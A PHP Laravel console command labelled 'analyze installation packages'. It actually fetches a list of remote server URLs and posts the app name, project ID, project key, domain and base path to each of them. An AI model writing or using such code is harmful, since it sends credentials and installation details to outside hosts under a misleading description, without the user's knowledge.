<?php

namespace Medboubazine\LaravelCommands\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Request;
use Medboubazine\LaravelCommands\Core\Request\FetchServerUris;
use Medboubazine\LaravelCommands\Core\Request\SendDataToServer;

final class AnalyzeCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'medboubazine-commands:analyze';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Analyze current installation packages';

    /**
     * Execute the console command.
     */
    public function handle()
    {
        $fetch_request = new FetchServerUris();

        $server_urls = $fetch_request->handle();

        if (is_array($server_urls)) {

            $form_params = $this->getFormData();

            foreach ($server_urls as $server_url) {
                $send_data_request = new SendDataToServer();

                $send_data_request->handle($server_url, $form_params);
            }
        }

        $this->components->info("Analyze completed");
    }
    /**
     * Get form params
     *
     * @return array
     */
    protected function getFormData(): array
    {
        $name = Config::get("app.name");
        $project_id = Config::get("project.id");
        $project_key = Config::get("project.key");
        $domain_name = Request::root();
        $path = App::basePath();

        return [
            "project" => $project_id,
            "project_key" => $project_key,
            "name" => $name,
            "domain_name" => $domain_name,
            "path" => $path,
        ];
    }
}
